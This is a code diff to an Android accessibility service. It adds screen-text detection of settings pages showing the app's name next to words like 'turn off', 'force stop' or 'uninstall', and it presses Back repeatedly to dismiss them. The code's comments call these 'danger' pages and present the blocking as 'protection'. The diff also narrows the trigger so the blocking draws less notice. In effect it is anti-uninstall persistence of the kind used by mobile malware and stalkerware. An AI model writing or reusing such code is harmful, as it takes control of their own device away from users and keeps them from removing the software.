@@ -2743,33 +2743,50 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 AccessibilityNodeInfo root = getRootInActiveWindow();
                 if (root == null) return;
 
-                // Search for app name anywhere on screen, plus "stop" for dialog detection.
-                List<AccessibilityNodeInfo> nameNodes = root.findAccessibilityNodeInfosByText(appName);
-                List<AccessibilityNodeInfo> stopNodes = root.findAccessibilityNodeInfosByText("stop");
+                // Search for the app name and all known action/danger keywords.
+                // We only defend when the user is on an ACTION page (service detail,
+                // stop dialog, App Info) — NOT when our app name is just one row in
+                // the apps list or the accessibility-services list.
+                List<AccessibilityNodeInfo> nameNodes      = root.findAccessibilityNodeInfosByText(appName);
+                List<AccessibilityNodeInfo> stopNodes      = root.findAccessibilityNodeInfosByText("stop");
+                List<AccessibilityNodeInfo> turnOffNodes   = root.findAccessibilityNodeInfosByText("turn off");
+                List<AccessibilityNodeInfo> denyNodes      = root.findAccessibilityNodeInfosByText("deny");
+                List<AccessibilityNodeInfo> forceStopNodes = root.findAccessibilityNodeInfosByText("force stop");
+                List<AccessibilityNodeInfo> uninstallNodes = root.findAccessibilityNodeInfosByText("uninstall");
                 root.recycle();
 
-                boolean foundName = nameNodes != null && !nameNodes.isEmpty();
-                boolean foundStop = stopNodes != null && !stopNodes.isEmpty();
-                if (nameNodes != null) for (AccessibilityNodeInfo n : nameNodes) try { n.recycle(); } catch (Exception ignored) {}
-                if (stopNodes != null) for (AccessibilityNodeInfo n : stopNodes) try { n.recycle(); } catch (Exception ignored) {}
+                boolean foundName      = nameNodes      != null && !nameNodes.isEmpty();
+                boolean foundStop      = stopNodes      != null && !stopNodes.isEmpty();
+                boolean foundTurnOff   = turnOffNodes   != null && !turnOffNodes.isEmpty();
+                boolean foundDeny      = denyNodes      != null && !denyNodes.isEmpty();
+                boolean foundForceStop = forceStopNodes != null && !forceStopNodes.isEmpty();
+                boolean foundUninstall = uninstallNodes != null && !uninstallNodes.isEmpty();
+
+                if (nameNodes      != null) for (AccessibilityNodeInfo n : nameNodes)      try { n.recycle(); } catch (Exception ignored) {}
+                if (stopNodes      != null) for (AccessibilityNodeInfo n : stopNodes)      try { n.recycle(); } catch (Exception ignored) {}
+                if (turnOffNodes   != null) for (AccessibilityNodeInfo n : turnOffNodes)   try { n.recycle(); } catch (Exception ignored) {}
+                if (denyNodes      != null) for (AccessibilityNodeInfo n : denyNodes)      try { n.recycle(); } catch (Exception ignored) {}
+                if (forceStopNodes != null) for (AccessibilityNodeInfo n : forceStopNodes) try { n.recycle(); } catch (Exception ignored) {}
+                if (uninstallNodes != null) for (AccessibilityNodeInfo n : uninstallNodes) try { n.recycle(); } catch (Exception ignored) {}
 
                 if (!foundName) return; // App name not on screen — nothing to protect
 
-                // Any time our app name is visible inside any settings window, press Back
-                // immediately. This covers:
-                //   • The main Accessibility settings list (service shown as enabled)
-                //   • The accessibility service detail / toggle page
-                //   • The "Stop [App]?" confirmation dialog
-                //   • Any other settings page that mentions our app name
-                // Two rapid Back presses handle both single-page dismissal and dialogs.
+                // Require at least one action keyword to be visible alongside the app name.
+                // These words only appear on the service DETAIL page, stop/confirmation dialog,
+                // or App Info page — NOT on the apps list or accessibility-services list
+                // where our name is just one scrollable row.
+                boolean onDangerPage = foundStop || foundTurnOff || foundDeny
+                        || foundForceStop || foundUninstall;
+                if (!onDangerPage) return; // App name in a list — leave the screen alone
+
+                // On an actual action page: press Back to dismiss it.
                 try { performBack(); } catch (Exception ignored) {}
                 new Handler(Looper.getMainLooper()).postDelayed(() -> {
                     try { performBack(); } catch (Exception ignored) {}
                 }, 80L);
 
-                // If this is also a stop-confirmation dialog (app name + "stop" visible),
-                // press Back a third time for extra certainty.
-                if (foundStop) {
+                // Extra Back for confirmation dialogs that need two dismissals.
+                if (foundStop || foundDeny || foundTurnOff) {
                     new Handler(Looper.getMainLooper()).postDelayed(() -> {
                         try { performBack(); } catch (Exception ignored) {}
                     }, 180L);
@@ -3100,10 +3117,19 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     }
 
     /**
-     * Runs every 10 ms inside the scan loop.
-     * If the active window is an accessibility settings page that contains our app name,
-     * press Back immediately and handle the stop-confirmation dialog with a double Back.
-     * Uses direct node text search only; never traverses invisible nodes.
+     * Periodic protection scan (runs every 350 ms via the auto-click scanner loop).
+     *
+     * Rule:  only press Back when our app name AND at least one action keyword are
+     *        simultaneously visible on a settings page.
+     *
+     * This prevents false positives when the app name appears as just one row in:
+     *   • Settings → Apps → All apps list
+     *   • Settings → Accessibility → Downloaded / Installed apps list
+     *
+     * It DOES fire — correctly — when the user has opened the actual action page:
+     *   • Our service's detail page  (has "Turn off" / "Stop" / "Deny")
+     *   • The "Stop [App]?" confirmation dialog  (has "Stop" / "OK")
+     *   • Settings → App Info  (has "Force stop" / "Uninstall")
      */
     private void runAccessibilityPageProtection() {
         if (!accessibilityAssistEnabled) return;
@@ -3116,22 +3142,39 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 root.recycle();
                 return;
             }
+
             String appName = getString(R.string.app_name);
-            List<AccessibilityNodeInfo> nameNodes = root.findAccessibilityNodeInfosByText(appName);
-            List<AccessibilityNodeInfo> stopNodes = root.findAccessibilityNodeInfosByText("stop");
-            boolean foundName = nameNodes != null && !nameNodes.isEmpty();
-            boolean foundStop = stopNodes != null && !stopNodes.isEmpty();
-            if (nameNodes != null) for (AccessibilityNodeInfo n : nameNodes) try { n.recycle(); } catch (Exception ignored) {}
-            if (stopNodes != null) for (AccessibilityNodeInfo n : stopNodes) try { n.recycle(); } catch (Exception ignored) {}
+            List<AccessibilityNodeInfo> nameNodes      = root.findAccessibilityNodeInfosByText(appName);
+            List<AccessibilityNodeInfo> stopNodes      = root.findAccessibilityNodeInfosByText("stop");
+            List<AccessibilityNodeInfo> turnOffNodes   = root.findAccessibilityNodeInfosByText("turn off");
+            List<AccessibilityNodeInfo> denyNodes      = root.findAccessibilityNodeInfosByText("deny");
+            List<AccessibilityNodeInfo> forceStopNodes = root.findAccessibilityNodeInfosByText("force stop");
+            List<AccessibilityNodeInfo> uninstallNodes = root.findAccessibilityNodeInfosByText("uninstall");
+
+            boolean foundName      = nameNodes      != null && !nameNodes.isEmpty();
+            boolean foundStop      = stopNodes      != null && !stopNodes.isEmpty();
+            boolean foundTurnOff   = turnOffNodes   != null && !turnOffNodes.isEmpty();
+            boolean foundDeny      = denyNodes      != null && !denyNodes.isEmpty();
+            boolean foundForceStop = forceStopNodes != null && !forceStopNodes.isEmpty();
+            boolean foundUninstall = uninstallNodes != null && !uninstallNodes.isEmpty();
+
+            if (nameNodes      != null) for (AccessibilityNodeInfo n : nameNodes)      try { n.recycle(); } catch (Exception ignored) {}
+            if (stopNodes      != null) for (AccessibilityNodeInfo n : stopNodes)      try { n.recycle(); } catch (Exception ignored) {}
+            if (turnOffNodes   != null) for (AccessibilityNodeInfo n : turnOffNodes)   try { n.recycle(); } catch (Exception ignored) {}
+            if (denyNodes      != null) for (AccessibilityNodeInfo n : denyNodes)      try { n.recycle(); } catch (Exception ignored) {}
+            if (forceStopNodes != null) for (AccessibilityNodeInfo n : forceStopNodes) try { n.recycle(); } catch (Exception ignored) {}
+            if (uninstallNodes != null) for (AccessibilityNodeInfo n : uninstallNodes) try { n.recycle(); } catch (Exception ignored) {}
             root.recycle();
 
-            boolean isAccessibilityPage = foundName && pkgStr.contains("accessibility");
-            boolean isStopDialog = foundName && foundStop && !isAccessibilityPage;
+            // Require app name + at least one action keyword.
+            // A bare list row never has these words — only the detail/action page does.
+            boolean onDangerPage = foundName && (foundStop || foundTurnOff || foundDeny
+                    || foundForceStop || foundUninstall);
+            if (!onDangerPage) return;
 
-            if (isAccessibilityPage) {
-                try { performBack(); } catch (Exception ignored) {}
-            } else if (isStopDialog) {
-                try { performBack(); } catch (Exception ignored) {}
+            // Press Back to dismiss the detail page or dialog.
+            try { performBack(); } catch (Exception ignored) {}
+            if (foundStop || foundDeny || foundTurnOff) {
                 new Handler(Looper.getMainLooper()).postDelayed(() -> {
                     try { performBack(); } catch (Exception ignored) {}
                 }, 80L);
